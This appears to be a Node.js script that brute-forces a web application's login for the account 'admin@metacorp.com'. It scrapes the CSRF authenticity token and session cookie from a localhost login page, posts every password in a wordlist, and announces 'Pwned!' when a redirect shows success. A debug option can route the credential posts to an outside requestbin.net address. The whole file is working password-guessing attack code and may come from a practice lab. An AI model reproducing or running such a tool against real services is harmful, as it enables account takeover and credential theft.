import axios from 'axios';
import { inspect } from 'util';
import { readFileSync, exists } from 'fs';
import * as qs from 'qs';

const bruteForce = async (email, password) => {
    const client = axios.create();
    const response = await client.get('http://localhost:3000/login');
    const body = response.data;
    const match = /name="authenticity_token" value="([^"]*)"/g.exec(response.data);
    const csrfToken = match[1];

    const payload = {
        'utf8': '✓',
        'authenticity_token': csrfToken,
        'email': email,
        'password': password,
        'commit': 'Login'
    }
    const debug = false;
    try {
        const loginResponse = await client.post(debug ? 'http://requestbin.net/r/1hspjub1' : 'http://localhost:3000/sessions', qs.stringify(payload),
            {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    Cookie: response.headers['set-cookie'][0].split(";")[0].trim()
                },
                maxRedirects: 0,
            });
    } catch (error) {
        if (error.response && error.response.status == 302) {
            return true;
        }
        else {
            throw error;
        }
    }
    return false;
}


const tryPasswordWordlist = async (email) => {
    const wordlist = readFileSync('wordlist.txt').toString().split('\n');
    for (const word of wordlist) {
        console.log(`Trying ${email} : ${word}`);
        const hacked = await bruteForce(email, word);
        if (hacked) {
            console.log('----------------------------------------------------')
            console.log(`😎 Pwned! This combination works: ${email} : ${word}`);
            process.exit(0);
        }
    }
}



tryPasswordWordlist('admin@metacorp.com');
